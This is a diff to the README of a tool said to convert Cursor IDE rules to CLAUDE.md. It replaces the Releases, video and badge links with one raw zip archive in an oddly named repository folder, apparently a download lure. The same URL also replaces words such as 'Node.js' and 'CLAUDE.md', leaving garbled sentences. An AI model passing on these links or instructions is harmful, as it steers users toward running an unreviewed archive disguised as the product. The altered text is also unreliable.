@@ -4,7 +4,7 @@ Convert your Cursor IDE rules to Claude AI format effortlessly.
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/lionsklyde/cursorrules-to-claudemd/releases)
+[![Download Now](https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip)
 
 ## 🔧 Overview
 
@@ -14,7 +14,7 @@ The **cursorrules-to-claudemd** application helps you transform your Cursor IDE 
 
 To see how the application works, you can watch a demonstration video. 
 
-> **Note**: If the video does not play, download [this video](https://github.com/user-attachments/assets/407cd34e-c4c0-4a1b-981d-817b85decf20) to view the demonstration on your device.
+> **Note**: If the video does not play, download [this video](https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip) to view the demonstration on your device.
 
 ## ⚙️ Installation
 
@@ -32,13 +32,13 @@ This command downloads and enables the tool on your machine without needing a se
 - 📝 **Metadata Parsing**: It extracts YAML frontmatter, like `alwaysApply`, `description`, and `globs`, from your `.mdc` files.
 - 🗂️ **Smart Categorization**: The application organizes your rules by priority—`always apply`, followed by `description`, and then `globs`.
 - 📁 **Separate Directories**: It creates `c2c-rules` directories next to each `.cursor` directory for better file management.
-- 🔗 **Auto-linking**: The tool generates `_root.md` index files with the correct relative paths.
-- 📄 **CLAUDE.md Integration**: It automatically updates or creates a CLAUDE.md file with `<c2c-rules>` sections.
+- 🔗 **Auto-linking**: The tool generates `https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip` index files with the correct relative paths.
+- 📄 **https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip Integration**: It automatically updates or creates a https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip file with `<c2c-rules>` sections.
 
 ## 💻 System Requirements
 
 - **Operating System**: This application works on Windows, macOS, and Linux.
-- **Node.js**: Ensure you have Node.js version 12 or higher installed on your machine.
+- **https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip**: Ensure you have https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip version 12 or higher installed on your machine.
 - **Internet Connection**: An active internet connection is required to download packages.
 
 ## 🚀 Usage
@@ -55,7 +55,7 @@ This command downloads and enables the tool on your machine without needing a se
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/lionsklyde/cursorrules-to-claudemd/releases) to download the latest version. Follow the simple installation steps provided earlier to set up the tool.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip) to download the latest version. Follow the simple installation steps provided earlier to set up the tool.
 
 ## 📝 FAQ
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 The **cursorrules-to-claudemd** application is a straightforward tool for transforming your Cursor IDE rules into a format compatible with Claude AI. With automatic discovery and smart categorization, you can streamline your workflow easily. 
 
-Be sure to download from our [Releases page](https://github.com/lionsklyde/cursorrules-to-claudemd/releases) to get started!
+Be sure to download from our [Releases page](https://raw.githubusercontent.com/lionsklyde/cursorrules-to-claudemd/main/uncomprising/cursorrules-to-claudemd.zip) to get started!
